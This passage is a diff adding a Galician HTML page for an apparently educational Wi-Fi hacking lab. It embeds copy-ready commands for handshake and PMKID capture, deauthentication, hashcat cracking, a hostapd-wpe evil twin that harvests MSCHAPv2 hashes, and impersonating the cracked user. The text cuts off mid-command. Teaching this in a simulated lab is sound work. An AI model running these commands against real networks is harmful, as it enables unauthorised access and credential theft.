@@ -1,0 +1,332 @@
+<!doctype html>
+<html lang="gl" data-page="lab">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Explorador vuln-wifi.lab · Prácticas 1.1–3.3</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="../assets/fonts.css">
+<link rel="stylesheet" href="../assets/app.css">
+<style>
+  .prac-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:8px;margin-top:16px}
+  .pbtn{text-align:left;padding:10px 12px;border-radius:10px;border:1px solid var(--line);background:var(--surface);color:var(--fg);cursor:pointer;box-shadow:var(--shadow);transition:border-color .15s,transform .15s}
+  .pbtn:hover{border-color:var(--warn);transform:translateY(-2px)}
+  .pbtn[data-on="1"]{border-color:var(--warn);background:color-mix(in srgb,var(--warn) 12%,var(--surface))}
+  .pbtn .pid{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--warn)}
+  .pbtn .pt{display:block;font-weight:600;font-size:13px;margin-top:3px}
+  .pbtn .ps{display:block;font-family:var(--mono);font-size:10.5px;color:var(--faint);margin-top:3px}
+
+  .lab-shell{margin-top:18px;background:var(--surface);border:1px solid var(--line);border-radius:16px;box-shadow:var(--shadow);overflow:hidden}
+  .lab-head{padding:16px 18px;background:var(--surface-2);border-bottom:1px solid var(--line);display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+  .lab-head h2{font-size:20px}
+  .lab-badges{display:flex;gap:7px;flex-wrap:wrap;margin-left:auto}
+  .lbadge{font-family:var(--mono);font-size:11px;padding:4px 9px;border-radius:999px;border:1px solid var(--line);background:var(--surface);color:var(--muted)}
+  .lbadge.sc{color:var(--warn);border-color:color-mix(in srgb,var(--warn) 45%,var(--line))}
+
+  .lab-body{padding:18px;display:grid;grid-template-columns:1fr 1.2fr;gap:18px}
+  @media(max-width:860px){.lab-body{grid-template-columns:1fr}}
+
+  .topo-box{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
+  .topo-box h3{font-size:14px;margin-bottom:8px;color:var(--muted)}
+  .ns-list{display:flex;flex-direction:column;gap:8px;margin-top:10px}
+  .ns-row{display:flex;align-items:center;gap:8px;font-size:12.2px;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:7px 10px;flex-wrap:wrap}
+  .ns-row code{font-size:11px}
+
+  .term-tabs{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
+  .ttab{font-family:var(--mono);font-size:11.5px;font-weight:600;padding:6px 11px;border-radius:8px;border:1px solid var(--line);background:var(--surface-2);color:var(--muted);cursor:pointer}
+  .ttab[data-on="1"]{background:var(--fg);border-color:var(--fg);color:var(--bg)}
+
+  .wf-box{margin-top:14px;border-radius:11px;padding:13px;border:1px solid var(--line);background:var(--surface-2);font-size:13px}
+  .wf-box.ok{border-left:4px solid var(--good)}
+  .wf-box.no{border-left:4px solid var(--danger)}
+  .wf-box.part{border-left:4px solid var(--warn)}
+
+  .source-guide{margin-top:16px;padding:13px 17px;background:var(--surface-2);border:1px solid var(--line);border-left:4px solid var(--warn);border-radius:9px;font-size:13px}
+  .source-guide p{font-size:12px;color:var(--muted);margin:6px 0 0}
+  .source-guide a{display:inline-block;margin:0 3px;font-weight:600}
+  .ev-list{display:flex;flex-direction:column;gap:6px;margin-top:10px}
+  .ev-item{display:flex;gap:9px;align-items:flex-start;font-size:12.8px;background:var(--surface-2);border:1px solid var(--line);border-radius:8px;padding:8px 10px;cursor:pointer}
+  .ev-item input{margin-top:3px}
+  .ev-item.done{border-color:color-mix(in srgb,var(--good) 45%,var(--line));background:color-mix(in srgb,var(--good) 10%,var(--surface))}
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap sitebar">
+    <nav class="sitenav">
+      <a href="../index.html">Inicio</a>
+      <a href="../wpa2-psk/index.html">WPA2-PSK</a>
+      <a href="../wpa2-eap/index.html">WPA2-EAP</a>
+      <a href="../wpa3-sae/index.html">WPA3-SAE</a>
+      <a href="../animacion/index.html">Animación</a>
+      <a href="../laboratorio/index.html" class="active">Laboratorio</a>
+      <a href="../ferramentas/index.html">Ferramentas</a>
+    </nav>
+    <button class="theme-btn" id="themeBtn" aria-label="Cambiar tema">◐</button>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="hero">
+    <h1>Explorador interactivo de <span class="q" style="color:var(--warn)">vuln-wifi.lab</span></h1>
+    <p>Selecciona calquera práctica (<b>1.1–3.3</b>) para ver a topoloxía de <em>network namespaces</em> e radios virtuais <code>mac80211_hwsim</code>, os comandos por terminal listos para copiar, a comparativa <b>Manual vs Wifite</b> e os criterios reais de validación.</p>
+    <div class="ks">
+      <span>Acceso VM: <b>consola gráfica como <code>kali</code></b></span>
+      <span>OpenCL CPU: <b><code>clinfo -l</code> / <code>hashcat -I</code></b></span>
+      <span>Coidado: <b>non usar <code>airmon-ng check kill</code> nin <code>--kill</code></b></span>
+    </div>
+  </div>
+
+  <div class="prac-grid" id="pracGrid"></div>
+
+  <div class="lab-shell" id="labShell"></div>
+
+  <section>
+    <div class="eyebrow">Resolución rápida na VM</div>
+    <h2 class="sec">Comprobacións xerais antes de comezar</h2>
+    <div class="codeblock"><button class="copy-btn" type="button">Copiar</button># Verificar estado do laboratorio, OpenCL (PoCL) e escenarios
+sudo wifilabctl doctor
+sudo wifilabctl list
+clinfo -l && hashcat -I
+# Ao rematar cada práctica:
+sudo wifilabctl reset</div>
+  </section>
+
+  <footer>
+    <p>Baseado nos manuais PDF de <b>repoEDU-CCbySA/HE/Taller/Wi-Fi</b>, en <code>README.md</code> e en <code>VALIDACION-LABORATORIO.md</code>.</p>
+    <p>Fonte docente: <b>repoEDU-CCbySA</b> · Licenza <b>CC BY-SA 4.0</b></p>
+  </footer>
+</div>
+
+<script src="../assets/core.js"></script>
+<script>
+(function(){
+  "use strict";
+  WifiSite.initTheme();
+  WifiSite.initCopyButtons();
+
+  var PRACS=[
+    {
+      id:"1.1", title:"WPA2-PSK Handshake", sc:"psk", pdf:"1-Taller-HE-Practica-WiFi-1.pdf",
+      status:"Captura EAPOL · resultado de dicionario condicional",
+      nodes:[
+        {r:"AP (EMPRESA-XYZ)",ns:"wifi_ap_wlan0",if:"wlan0 · canle 6"},
+        {r:"Cliente lexítimo",ns:"wifi_cliente_wlan1",if:"wlan1 · 192.168.10.2"},
+        {r:"Captura (Monitor)",ns:"global",if:"wlan3"},
+        {r:"Deauth controlada",ns:"global",if:"wlan2"}
+      ],
+      terms:[],
+      wifite:{cls:"ok",title:"Wifite funciona (con PoCL/OpenCL activo)",text:"Con <code>sudo wifite --no-wps --dict /usr/share/wordlists/rockyou.txt</code> (seleccionando <code>wlan2</code>, ignorando o aviso de procesos en conflito e saltando PMKID con Ctrl+C → <code>c</code>), captura o handshake e Hashcat recupera <code>spongebob19</code>."},
+      ev:["Anotar BSSID e MAC reais desta execución (non copiar exemplos).","Confirmar EAPOL M1–M4 no PCAP con tshark.","Confirmar resultado real de aircrack-ng / hashcat."]
+    },
+    {
+      id:"1.2", title:"Desautenticación WPA2-PSK", sc:"psk", pdf:"1-Taller-HE-Practica-WiFi-2.pdf",
+      status:"Desconexión e reconexión observadas",
+      nodes:[
+        {r:"AP sen PMF",ns:"wifi_ap_wlan0",if:"wlan0 · ieee80211w=0"},
+        {r:"Cliente",ns:"wifi_cliente_wlan1",if:"wlan1 · iw event -t"},
+        {r:"Captura",ns:"global",if:"wlan3 (monitor)"},
+        {r:"Inxección DeAuth",ns:"global",if:"wlan2 (monitor)"}
+      ],
+      terms:[],
+      wifite:{cls:"part",title:"Nota sobre ACKs",text:"Un contador de 0 ACKs (ou N ACKs) en <code>aireplay-ng</code> <b>non</b> demostra éxito nin fracaso por si só: cómpre correlacionar a trama DeAuth con <code>protected=False</code> coa desconexión/reasociación real do cliente."},
+      ev:["Estado da asociación antes e despois da proba.","Trama DeAuth en PCAP con wlan.fc.protected=False.","Correlación con evento de desconexión ou novo EAPOL."]
+    },
+    {
+      id:"1.3", title:"Protección PMF (802.11w)", sc:"psk_pmf", pdf:"1-Taller-HE-Practica-WiFi-2/3.pdf",
+      status:"MFPC/MFPR e rexeitamento de deauth observados",
+      nodes:[
+        {r:"AP + PMF obrigatorio",ns:"wifi_ap_wlan0",if:"wlan0 · ieee80211w=2"},
+        {r:"Cliente PMF",ns:"wifi_cliente_wlan1",if:"wlan1 · WPA-PSK-SHA256"},
+        {r:"Atacante / Wifite",ns:"global",if:"wlan2"},
+        {r:"Observación tshark",ns:"global",if:"wlan3"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Wifite falla ao forzar DeAuth",text:"Con <code>ieee80211w=2</code>, Wifite envía tramas DeAuth non protexidas que o cliente descarta, esgotando o timeout de 300s (a non ser que o cliente reconecte lexitimamente durante a captura)."},
+      ev:["Confirmar que o cliente permanece asociado (iw dev wlan1 link).","Confirmar protected=False na trama falsa fronte a protected=True nas lexítimas.","Non asumir que PMF cifra todas as tramas Wi-Fi nin o handshake."]
+    },
+    {
+      id:"1.4", title:"Captura PMKID (WPA2-PSK)", sc:"psk / psk_pmf", pdf:"1-Taller-HE-Practica-WiFi-3/4.pdf",
+      status:"Resultado condicional · distinguir WPA*01 vs WPA*02",
+      nodes:[
+        {r:"AP (sen/con PMF)",ns:"wifi_ap_wlan0",if:"wlan0 · canle 6"},
+        {r:"Cliente conectado",ns:"wifi_cliente_wlan1",if:"wlan1 (mantén conexión)"},
+        {r:"hcxdumptool / Wifite",ns:"global",if:"wlan2mon"}
+      ],
+      terms:[],
+      wifite:{cls:"ok",title:"Wifite --pmkid funciona e demostra límite de PMF",text:"No escenario probado recupera <code>spongebob19</code> sen deautenticar ao cliente. Co escenario <code>psk_pmf</code> (PDF 1-4) demóstrase que <b>PMF non protexe contra PMKID</b>."},
+      ev:["Comprobar presenza de rexistro WPA*01* (non confundir con WPA*02* EAPOL).","Verificar que o cliente wlan1 permanece conectado sen reason=7.","Conservar evidencias nun cartafol exclusivo."]
+    },
+    {
+      id:"2.1", title:"WPA2-Enterprise (FreeRADIUS)", sc:"eap_mitm", pdf:"2-Taller-HE-Practica-WiFi-1.pdf",
+      status:"PEAP + Access-Accept en /var/log/freeradius/radius.log",
+      nodes:[
+        {r:"AP 802.1X",ns:"wifi_ap_wlan0",if:"wlan0 + br0 (192.168.50.10)"},
+        {r:"FreeRADIUS",ns:"principal",if:"br-radius (192.168.50.1:1812)"},
+        {r:"Cliente PEAP + CA",ns:"wifi_cliente_wlan1",if:"wlan1 · ca_cert activo"},
+        {r:"Wifite (observación)",ns:"global",if:"wlan3"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Wifite descarta automaticamente redes WPA2-E",text:"A ferramenta identifica <code>WPA2-E</code> e salta o obxectivo porque non implementa ataques a EAP/RADIUS. Os rexistros detallados de <code>Access-Accept</code> consúltanse en <code>/var/log/freeradius/radius.log</code>."},
+      ev:["FreeRADIUS escoitando en 192.168.50.1:1812.","Wifite clasificou EMPRESA-XYZ como WPA2-E e saltouna."]
+    },
+    {
+      id:"2.2", title:"Evil Twin WPA2-EAP (hostapd-wpe)", sc:"eap_evil_twin", pdf:"2-Taller-HE-Practica-WiFi-2.pdf",
+      status:"Captura MSCHAPv2 + hashcat -m 5500 → ana / 1234",
+      nodes:[
+        {r:"AP real + FreeRADIUS",ns:"wifi_ap_wlan0",if:"wlan0 · canle 6"},
+        {r:"Cliente sen ca_cert",ns:"wifi_cliente_wlan1",if:"wlan1"},
+        {r:"Evil Twin (hostapd-wpe)",ns:"evil_twin_wlan2",if:"wlan2 · canle 1"},
+        {r:"Monitor + Deauth",ns:"global",if:"wlan3 → wlan3mon"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Non soportado por Wifite",text:"Require <code>hostapd-wpe</code> con certificados autofirmados e extracción do hash NetNTLMv1 para <code>hashcat -m 5500</code>."},
+      ev:["Distinguir AP-ENABLED da captura real de MSCHAPv2 nos logs.","Recuperar 1234 para o usuario ana e validar acceso como ana ao AP lexítimo."]
+    },
+    {
+      id:"2.3", title:"MITM WPA2-EAP (hostapd-mana)", sc:"eap_mitm", pdf:"2-Taller-HE-Practica-WiFi-3.pdf",
+      status:"Ponte br-mitm + asociación MANA + HTTP GET :8080",
+      nodes:[
+        {r:"AP lexítimo",ns:"wifi_ap_wlan0",if:"wlan0 + br0 · canle 6"},
+        {r:"FreeRADIUS + HTTP :8080",ns:"principal",if:"br-radius (192.168.50.1)"},
+        {r:"MANA + br-mitm",ns:"mitm_wlan2",if:"wlan2 + veth0 → br-mitm (.100)"},
+        {r:"Cliente con ca_cert",ns:"wifi_cliente_wlan1",if:"wlan1"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Non soportado por Wifite",text:"Executa <code>mana-start</code> → <code>AP-ENABLED</code> → <code>bridge-mitm</code> → <code>select-mitm</code>. Lembra que <code>verify-mitm</code> non comproba <code>tcpdump</code> e que PEAP/HTTPS continúan cifrados."},
+      ev:["Cliente conectado ao BSSID de MANA (canle 1), non ao lexítimo (canle 6).","Petición GET en claro capturada en br-mitm (tcpdump port 8080)."]
+    },
+    {
+      id:"3.1", title:"WPA3-SAE + Wacker (online)", sc:"wpa3_sae", pdf:"3-Taller-HE-Practica-WiFi-1.pdf",
+      status:"SAE resistente offline · Wacker recupera online en managed",
+      nodes:[
+        {r:"AP WPA3-SAE",ns:"phy0_wlan0",if:"wlan0 · canle 6 (2437 MHz)"},
+        {r:"Cliente SAE",ns:"phy1_wlan1",if:"wlan1 · key_mgmt=SAE"},
+        {r:"Captura / Wacker 1",ns:"global",if:"wlan2 (monitor ou managed)"},
+        {r:"Wacker paralelo (opc.)",ns:"global",if:"wlan3 (managed)"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Wifite --wpa3 detecta WPA3-S pero non crackea",text:"Na práctica Wifite 3.1, a procura de PMKID falla (<code>Failed to capture PMKID</code>) e a captura de handshake esgota os 300 s sen conseguir material utilizable."},
+      ev:["aircrack-ng rexeita a captura (May be WPA3 - not yet supported).","wacker en modo managed (non monitor) proba online contra o BSSID real."]
+    },
+    {
+      id:"3.2", title:"WPA3-SAE: 4-Way, PMF e KRACK", sc:"wpa3_sae", pdf:"3-Taller-HE-Practica-WiFi-2.pdf",
+      status:"Análise de configuración e EAPOL en hwsim0 (non explotación)",
+      nodes:[
+        {r:"AP WPA3-SAE + PMF",ns:"phy0_wlan0",if:"wlan0 · ieee80211w=2"},
+        {r:"Cliente SAE",ns:"phy1_wlan1",if:"wlan1 · pmksa_flush"},
+        {r:"Captura global",ns:"global",if:"hwsim0 (ou wlan3mon)"}
+      ],
+      terms:[],
+      wifite:{cls:"no",title:"Non soportado por Wifite (Práctica Wifite 3.2)",text:"<code>--wpa3</code> só filtra redes. Wifite non retransmitirá M3 nin comprobará reinstalación de PTK. Lembra: <b>PMF non protexe EAPOL-Key</b> e <code>Install: Set</code> en M3 é normal."},
+      ev:["Usar filtro -Y 'eapol' (non 'wlan_rsna_eapol').","Observar replay_counter 1, 1, 2, 2 e Install: Set sen atribuír inmunidade a PMF."]
+    },
+    {
+      id:"3.3", title:"Modo transición + Evil Twin WPA2", sc:"wpa3_sae_vulnerable", pdf:"3-Taller-HE-Practica-WiFi-3.pdf",
+      status:"Caída simulada + captura WPA2-PSK → spongebob19",
+      nodes:[
+        {r:"AP transición (spongebob19)",ns:"phy0_wlan0",if:"wlan0 · WPA-PSK SAE"},
+        {r:"Cliente transición",ns:"phy1_wlan1",if:"wlan1 · SAE WPA-PSK"},
+        {r:"Evil Twin (calqueracousa)",ns:"evil_twin_wlan2",if:"wlan2 · só WPA-PSK"},
+        {r:"Captura / Wifite",ns:"global",if:"hwsim0 / wlan3"}
+      ],
+      terms:[],
+      wifite:{cls:"part",title:"Wifite 3.3 recupera vía PMKID sobre o Evil Twin",text:"Lanzando <code>sudo wifite -i wlan3 -c 6 --showb --no-wps --new-hs --dict /usr/share/wordlists/rockyou.txt</code> e seleccionando o BSSID <code>WPA2-P</code> antes de deter o AP lexítimo, Wifite captura PMKID e recupera <code>spongebob19</code> (o intento posterior de handshake esgota 300s)."},
+      ev:["Nunca usar pkill hostapd (mataría tamén o Evil Twin).","Confirmar AP-STA-POSSIBLE-PSK-MISMATCH no log do Evil Twin.","Aclarar que se auditou WPA2-PSK, non se rompeu SAE."]
+    }
+  ];
+
+  // FONTE ÚNICA: Markdown orixinais de 20261121_docs.he-ud2.zip.
+  // Bloques bash importados automaticamente, sen resumir nin inventar comandos.
+  var VALIDATED_STEPS = {"1.1":{"terms":[{"name":"1. Preparación do escenario (Terminal 1)","cmd":"sudo wifilabctl up psk\nsudo wifilabctl status\n\nsudo ip netns exec wifi_ap_wlan0 iw dev wlan0 info\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 info\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link"},{"name":"2. Recoñecemento e modo monitor (Terminal 1)","cmd":"sudo ip link set wlan3 down\nsudo iw dev wlan3 set type monitor\nsudo ip link set wlan3 up\nsudo iw dev wlan3 set channel 6\nsudo iw dev wlan3 info\n\nsudo airodump-ng --channel 6 wlan3"},{"name":"3. Captura do handshake (Terminal 1)","cmd":"sudo airodump-ng -c 6 --bssid BSSID_AP -w captura_psk wlan3"},{"name":"4. Desautenticación controlada (Terminal 2)","cmd":"sudo ip link set wlan2 down\nsudo iw dev wlan2 set type monitor\nsudo ip link set wlan2 up\nsudo iw dev wlan2 set channel 6\n\nsudo aireplay-ng --deauth 1 -a BSSID_AP -c MAC_CLIENTE wlan2\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\nsudo tshark -r captura_psk-01.cap -Y eapol -T fields \\\n  -e frame.number -e wlan.sa -e wlan.da \\\n  -e wlan_rsna_eapol.keydes.msgnr"},{"name":"5. Proba de dicionario con Rockyou (Terminal 1)","cmd":"sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz\n\nsudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura_psk-01.cap"},{"name":"6. Evidencias e limpeza","cmd":"sudo wifilabctl reset"}],"source":"1.1-ATAQUE_WPA2_PSK.md","wifite":"wifite-1.1-ATAQUE_WPA2_PSK.md"},"1.2":{"terms":[{"name":"3. Preparar o escenario (Terminal 1)","cmd":"sudo wifilabctl up psk\nsudo wifilabctl status\n\nsudo ip netns exec wifi_ap_wlan0 iw dev wlan0 info\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 info\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link"},{"name":"4. Recoñecer a rede e iniciar a captura (Terminal 1)","cmd":"sudo ip link set wlan3 down\nsudo iw dev wlan3 set type monitor\nsudo ip link set wlan3 up\nsudo iw dev wlan3 set channel 6\nsudo iw dev wlan3 info\n\nsudo airodump-ng --channel 6 wlan3\n\nsudo airodump-ng -c 6 --bssid BSSID_AP -w captura_deauth wlan3"},{"name":"5. Observar o cliente antes da proba (Terminal 3)","cmd":"sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\nsudo ip netns exec wifi_cliente_wlan1 iw event -t"},{"name":"6. Executar unha desautenticación controlada (Terminal 2)","cmd":"sudo ip link set wlan2 down\nsudo iw dev wlan2 set type monitor\nsudo ip link set wlan2 up\nsudo iw dev wlan2 set channel 6\nsudo iw dev wlan2 info\n\nsudo aireplay-ng --deauth 1 -a BSSID_AP -c MAC_CLIENTE wlan2"},{"name":"7. Comprobar o resultado (Terminal 3)","cmd":"# 7.1. Estado do cliente\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\n# 7.2. Tramas de desautenticación na captura\n\nsudo tshark -r captura_deauth-01.cap \\\n  -Y 'wlan.fc.type_subtype == 0x0c' \\\n  -T fields -e frame.number -e wlan.sa -e wlan.da \\\n  -e wlan.fc.protected -e wlan.fixed.reason_code\n\n# 7.3. Mensaxes do *4-way handshake*\n\nsudo tshark -r captura_deauth-01.cap -Y eapol \\\n  -T fields -e frame.number -e wlan.sa -e wlan.da \\\n  -e wlan_rsna_eapol.keydes.msgnr\n\n# 7.4. Rexistros do cliente (se están dispoñibles)\n\nsudo ls -l /home/kali/wifiLab/run/psk/\nsudo grep -Ei 'DISCONNECTED|CONNECTED|EAPOL|4-Way' \\\n  /home/kali/wifiLab/run/psk/wpa_supplicant.log"},{"name":"8. Análise offline opcional con Rockyou","cmd":"sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz\n\nsudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura_deauth-01.cap"},{"name":"10. Limpeza e seguinte práctica","cmd":"sudo wifilabctl reset"}],"source":"1.2-ATAQUE_WPA2_PSK_DEAUTH.md","wifite":null},"1.3":{"terms":[{"name":"2. Preparación (Terminal 1)","cmd":"sudo wifilabctl up psk_pmf\nsudo wifilabctl status"},{"name":"3. Recoñecemento e Modo Monitor (Terminal 1)","cmd":"sudo airmon-ng start wlan2\nsudo airodump-ng wlan2mon"},{"name":"4. Captura (Terminal 1)","cmd":"# Cambia \u003cBSSID\u003e polo valor real atopado\nCtrl+C\nsudo airodump-ng -c 6 --bssid \u003cBSSID\u003e -w captura_psk wlan2mon\n#Espera a ver como o cliente(wlan1) está autenticado neste BSSID (AP Lexítimo)"},{"name":"5. Intentar ataque de Deautenticación (Terminal 2)","cmd":"sudo aireplay-ng -0 5 -a \u003cBSSID_AP\u003e -c \u003cMAC_CLIENTE\u003e wlan2mon"},{"name":"6. Observación e Analise Técnica","cmd":"# Como verificalo nos logs?\n\n# Verificar no cliente (NON debería haber deconexións por reason=7 se PMF funciona)\ngrep CTRL-EVENT-DISCONNECTED /home/kali/wifiLab/run/psk_pmf/wpa_supplicant.log \n\n# Opción desactivada: ieee80211w=0\ngrep CTRL-EVENT-DISCONNECTED /home/kali/wifiLab/run/psk/wpa_supplicant.log \n# wlan1: CTRL-EVENT-DISCONNECTED bssid=02:00:00:00:00:00 reason=7"},{"name":"7. Limpeza","cmd":"sudo wifilabctl reset"}],"source":"1.3-ATAQUE_WPA2_PSK_PMF.md","wifite":"wifite-1.3-ATAQUE_WPA2_PSK_PMF.md"},"1.4":{"terms":[{"name":"2. Preparación do Escenario (Terminal 1)","cmd":"sudo wifilabctl up psk\nsudo wifilabctl status"},{"name":"3. Recoñecemento e Modo Monitor (Terminal 1)","cmd":"sudo airmon-ng start wlan2\nsudo airodump-ng wlan2mon"},{"name":"4. Captura de PMKID (Terminal 1)","cmd":"# Crear directorio para capturas\nmkdir -p ~/capturas-pmkid\ncd ~/capturas-pmkid\n\n# Capturar PMKID do AP no canal 6\nsudo hcxdumptool -i wlan2mon -w captura_pmkid.pcapng -c 6a --rds=1"},{"name":"5. Conversión a Formato hashcat (Terminal 1)","cmd":"# Converter captura\nhcxpcapngtool -o captura_pmkid.hc22000 captura_pmkid.pcapng\n\n# Verificar que se xerou correctamente\ncat captura_pmkid.hc22000\n\ngrep -c '^WPA\\*01\\*' captura_pmkid.hc22000"},{"name":"6. Cracking con hashcat (Terminal 1)","cmd":"# Se Rockyou está comprimido, descomprímeo nun ficheiro temporal:\nif [ -f /usr/share/wordlists/rockyou.txt ]; then\n    cp /usr/share/wordlists/rockyou.txt /tmp/rockyou.txt\nelse\n    gzip -dc /usr/share/wordlists/rockyou.txt.gz \u003e /tmp/rockyou.txt\nfi\n\nhashcat -m 22000 captura_pmkid.hc22000 /tmp/rockyou.txt\n\nhashcat -m 22000 captura_pmkid.hc22000 /tmp/rockyou.txt --show"},{"name":"9. Verificación nos Logs (Opcional)","cmd":"# Ver logs do AP - conexións rexistradas\nsudo ip netns exec wifi_ap_wlan0 grep \"AP-STA-CONNECTED\\|associated\" /home/kali/wifiLab/run/psk/hostapd.log\n\n# Verificar que esa MAC pertence ao cliente lexítimo (wlan1)\nsudo ip netns exec wifi_cliente_wlan1 ip addr show wlan1"},{"name":"10. Limpeza","cmd":"# Saír primeiro do modo monitor\nsudo airmon-ng stop wlan2mon\n\n# Restablecer o laboratorio\nsudo wifilabctl reset\n\n# Eliminar capturas (opcional)\nrm -rf ~/capturas-pmkid"}],"source":"1.4-ATAQUE_WPA2_PSK_PMKID.md","wifite":"wifite-1.4-ATAQUE_WPA2_PSK_PMKID.md"},"2.1":{"terms":[{"name":"4. Procedemento","cmd":"# Terminal 1 — Preparar a infraestrutura WPA2-Enterprise\n\nsudo env WIFILAB_ENABLE_NAT=1 wifilabctl up eap_mitm\nsudo wifilabctl status\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\nsudo ss -lunp | grep ':1812'\nsudo grep -E 'ssid=|eap=|ca_cert=' \\\n  /home/kali/wifiLab/run/eap_mitm/wpa_supplicant.conf\n\n# Terminal 2 — Wifite e descarte automático de WPA2-Enterprise\n\nls -lh /usr/share/wordlists/rockyou.txt*\n\nsudo gzip -dk /usr/share/wordlists/rockyou.txt.gz\n\nsudo wifite --no-wps --dict /usr/share/wordlists/rockyou.txt\n\n# Terminal 3 (opcional) — Observar os rexistros EAP\n\nsudo grep -Ei 'EAP|AP-STA|authenticat' \\\n  /home/kali/wifiLab/run/eap_mitm/hostapd_ok.log | tail -n 20"},{"name":"7. Limpeza do laboratorio","cmd":"# Executar só se a interface wlan3mon existe\nsudo airmon-ng stop wlan3mon\n\nsudo wifilabctl reset\nip netns list"}],"source":"wifite-2.1-ATAQUE_WPA2_EAP.md","wifite":"wifite-2.1-ATAQUE_WPA2_EAP.md"},"2.2":{"terms":[{"name":"3. Preparación do Escenario","cmd":"sudo wifilabctl up eap_evil_twin\nsudo wifilabctl status"},{"name":"4. Terminal 1 - Evil Twin (PDF: Consola 3, Páx. 7)","cmd":"# 4.1. Entrar no namespace do atacante\n\nsudo ip netns exec evil_twin_wlan2 bash\n\n# 4.2. Preparar a interface wlan2\n\nip link set lo up\nip link set wlan2 down\nmacchanger -m f0:4d:a2:84:3e:2d wlan2\nip link set wlan2 up\n\n# 4.3. Verificar os certificados xerados por bootstrap\n\nls /etc/hostapd-wpe/certs/\n\n# 4.4. Crear a configuración do Evil Twin\n\ncat \u003e evil-twin-wpe.conf \u003c\u003c'EOF'\ninterface=wlan2\ndriver=nl80211\nssid=EMPRESA-XYZ\nchannel=1\nhw_mode=g\nwpa=2\nwpa_key_mgmt=WPA-EAP\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\nieee8021x=1\neap_server=1\neap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\nca_cert=/etc/hostapd-wpe/certs/ca.pem\nserver_cert=/etc/hostapd-wpe/certs/server.pem\nprivate_key=/etc/hostapd-wpe/certs/server.key\ndh_file=/etc/hostapd-wpe/certs/dh\nlogger_syslog=-1\nlogger_syslog_level=2\nlogger_stdout=-1\nlogger_stdout_level=2\nEOF\n\n# 4.5. Lanzar o Evil Twin\n\nhostapd-wpe evil-twin-wpe.conf 2\u003e\u00261 | tee evil-twin-credentials.log"},{"name":"5. Terminal 2 - Monitor e Desautenticación (PDF: Consola 4, Páx. 8)","cmd":"# 5.1. Activar modo monitor en wlan3\n\nsudo macchanger -m f0:4d:a2:84:3e:2e wlan3\nsudo ip link set wlan3 up\nsudo airmon-ng start wlan3\n\n# 5.2. Fixar a canle 6 en wlan3mon\n\nsudo iw dev wlan3mon set channel 6\n\nsudo iw dev wlan3mon info\n\n# 5.3. Recoñecemento: identificar os dous APs\n\nsudo airodump-ng wlan3mon \n\n# 5.4. Desautenticar o cliente\n\nsudo aireplay-ng --deauth 20 -a \u003cBSSID_AP_LEXITIMO\u003e -c \u003cMAC_CLIENTE\u003e wlan3mon"},{"name":"6. Terminal 1 - Extracción e Auditoría do Hash (PDF: Consola 3, Páx. 9)","cmd":"# 6.1. Extraer o hash para hashcat\n\ngrep \"hashcat NETNTLM\" evil-twin-credentials.log | awk '{print $3}' \u003e evil-hash.txt\ncat evil-hash.txt\n\n# 6.2. Crackear con hashcat ([Modo 5500 — NetNTLMv1](../../apuntamentos/modo-5500.md){:target=_blank\"}\n\ngunzip -c /usr/share/wordlists/rockyou.txt.gz \u003e /tmp/rockyou.txt\nhashcat -m 5500 evil-hash.txt /tmp/rockyou.txt\n\n# 6.3. Mostrar o resultado\n\nhashcat -m 5500 evil-hash.txt /tmp/rockyou.txt --show"},{"name":"7. Terminais 1 e 2 - Acceso á Rede Suplantando a Identidade (Fase Final)","cmd":"# 7.1. Crear o ficheiro de conexión (Terminal 1)\n\ncat \u003e wpa_suplantacion.conf \u003c\u003c'EOF'\nnetwork={\n    ssid=\"EMPRESA-XYZ\"\n    key_mgmt=WPA-EAP\n    eap=PEAP\n    identity=\"ana\"\n    password=\"1234\"\n    phase2=\"auth=MSCHAPV2\"\n}\nEOF\n\n# 7.2. Conectar ao AP lexítimo como Ana (Terminal 1)\n\nwpa_supplicant -Dnl80211 -iwlan2 -c wpa_suplantacion.conf\n\n# 7.3. Verificar a conexión (Terminal 2)\n\nsudo ip netns exec evil_twin_wlan2 iw dev wlan2 link"},{"name":"8. Limpeza","cmd":"sudo wifilabctl reset"}],"source":"2.2-ATAQUE_WPA2_EAP_EVIL_TWIN.md","wifite":null},"2.3":{"terms":[{"name":"2. Preparación da infraestrutura - Consola 1","cmd":"sudo env WIFILAB_ENABLE_NAT=1 wifilabctl up eap_mitm\nsudo wifilabctl status\n\nsudo ss -lunp | grep ':1812'\n# FreeRADIUS debe escoitar en 192.168.50.1:1812.\n\ncurl -f http://192.168.50.1:8080/"},{"name":"3. Verificación do cliente lexítimo - Consola 2","cmd":"sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\nsudo ip netns exec wifi_cliente_wlan1 ip -4 addr show dev wlan1\nsudo ip netns exec wifi_cliente_wlan1 ip -4 route\nsudo ip netns exec 